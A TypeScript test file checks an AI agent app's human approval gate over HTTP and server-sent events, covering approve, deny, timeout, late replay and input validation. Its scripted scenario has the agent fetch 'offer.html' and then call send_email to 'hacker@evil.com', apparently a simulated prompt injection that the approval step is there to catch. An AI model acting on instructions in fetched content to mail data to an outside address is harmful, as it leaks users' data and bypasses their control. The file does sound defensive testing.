import { describe, expect, it } from "vitest";
import { ApprovalManager } from "./approvals";
import { createApp } from "./app";
import { sentEmails } from "./db/schema";
import { scriptedClient, testDeps, toolUse } from "./testHelpers";

const post = (body: unknown) => ({
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify(body),
});

const attackScript = () =>
  scriptedClient([
    { content: [toolUse("t1", "fetch_page", { name: "offer.html" })], stop_reason: "tool_use" },
    { content: [toolUse("t2", "send_email", { to: "hacker@evil.com", subject: "s", body: "b" })], stop_reason: "tool_use" },
    { content: [{ type: "text", text: "All done." }], stop_reason: "end_turn" },
  ]);

/** Reads the SSE response until an event with this name arrives; returns its parsed data. */
async function waitForEvent(res: Response, name: string) {
  const reader = res.body!.getReader();
  const decoder = new TextDecoder();
  let buffer = "";
  for (;;) {
    const { value, done } = await reader.read();
    if (done) throw new Error(`stream ended before "${name}"`);
    buffer += decoder.decode(value, { stream: true });
    for (const block of buffer.split("\n\n")) {
      const lines = block.split("\n");
      if (lines.includes(`event: ${name}`)) {
        const data = lines.find((l) => l.startsWith("data: "))!.slice(6);
        await reader.cancel();
        return JSON.parse(data);
      }
    }
  }
}

function setup(timeoutMs = 5_000) {
  const { client } = attackScript();
  const approvals = new ApprovalManager(timeoutMs);
  const deps = testDeps(client, { requestApproval: approvals.handler, approvalTimeoutMs: timeoutMs + 1000 });
  return { app: createApp(deps, approvals), deps, approvals };
}

describe("approvals over HTTP", () => {
  it("agent waits; the browser sees the question over SSE; approve runs the tool", async () => {
    const { app, deps } = setup();
    const events = await app.request("/events");
    expect(events.headers.get("content-type")).toContain("text/event-stream");

    const chat = app.request("/chat", post({ message: "summarize offer.html" })); // blocks on the approval
    const approval = await waitForEvent(events, "approval_requested");
    expect(approval).toMatchObject({ tool: "send_email", args: { to: "hacker@evil.com" } });
    expect(approval.reasons[0].sources[0].toolName).toBe("fetch_page");
    expect(deps.db.select().from(sentEmails).all()).toHaveLength(0); // nothing ran yet

    const decided = await app.request(`/approvals/${approval.id}`, post({ decision: "approve" }));
    expect(decided.status).toBe(200);

    const body = (await (await chat).json()) as { toolCalls: { userResponse: string; outcome: string }[] };
    expect(body.toolCalls[1]).toMatchObject({ userResponse: "approved", outcome: "executed" });
    expect(deps.db.select().from(sentEmails).all()).toHaveLength(1);
  });

  it("deny blocks the tool", async () => {
    const { app, deps } = setup();
    const chat = app.request("/chat", post({ message: "summarize offer.html" }));
    const pending = await waitUntilPending(app);
    await app.request(`/approvals/${pending.id}`, post({ decision: "deny" }));

    const body = (await (await chat).json()) as { toolCalls: { userResponse: string; outcome: string }[] };
    expect(body.toolCalls[1]).toMatchObject({ userResponse: "denied", outcome: "blocked" });
    expect(deps.db.select().from(sentEmails).all()).toHaveLength(0);
  });

  it("denies on timeout and logs it", async () => {
    const { app, deps } = setup(50);
    const res = await app.request("/chat", post({ message: "summarize offer.html" }));
    const body = (await res.json()) as { toolCalls: { userResponse: string; outcome: string }[] };

    expect(body.toolCalls[1]).toMatchObject({ userResponse: "timeout", outcome: "blocked" });
    expect(deps.db.select().from(sentEmails).all()).toHaveLength(0);
    const logs = (await (await app.request("/logs")).json()) as { tool: string; userResponse: string }[];
    expect(logs[0]).toMatchObject({ tool: "send_email", userResponse: "timeout" });
  });

  it("replays waiting questions to a client that connects late", async () => {
    const { app } = setup();
    const chat = app.request("/chat", post({ message: "summarize offer.html" }));
    const pending = await waitUntilPending(app);

    const late = await waitForEvent(await app.request("/events"), "approval_requested");
    expect(late.id).toBe(pending.id);

    await app.request(`/approvals/${pending.id}`, post({ decision: "deny" }));
    await chat;
  });

  it("filters events by conversationId", async () => {
    const { app } = setup(50);
    const events = await app.request("/events?conversationId=someone-else");
    const reader = events.body!.getReader();
    expect(new TextDecoder().decode((await reader.read()).value)).toContain("event: ready");
    await app.request("/chat", post({ message: "summarize offer.html" })); // times out
    const race = await Promise.race([
      reader.read().then(() => "got data"),
      new Promise((r) => setTimeout(() => r("quiet"), 100)),
    ]);
    await reader.cancel();
    expect(race).toBe("quiet");
  });

  it("validates decisions and rejects unknown or repeated ones", async () => {
    const { app } = setup();
    expect((await app.request("/approvals/x", post({ decision: "maybe" }))).status).toBe(400);
    expect((await app.request("/approvals/x", post({ decision: "approve" }))).status).toBe(404);

    const chat = app.request("/chat", post({ message: "summarize offer.html" }));
    const pending = await waitUntilPending(app);
    expect((await app.request(`/approvals/${pending.id}`, post({ decision: "deny" }))).status).toBe(200);
    expect((await app.request(`/approvals/${pending.id}`, post({ decision: "approve" }))).status).toBe(404);
    await chat;
  });
});

async function waitUntilPending(app: ReturnType<typeof createApp>) {
  for (let i = 0; i < 100; i++) {
    const list = (await (await app.request("/approvals")).json()) as { id: string }[];
    if (list[0]) return list[0];
    await new Promise((r) => setTimeout(r, 10));
  }
  throw new Error("no approval appeared");
}
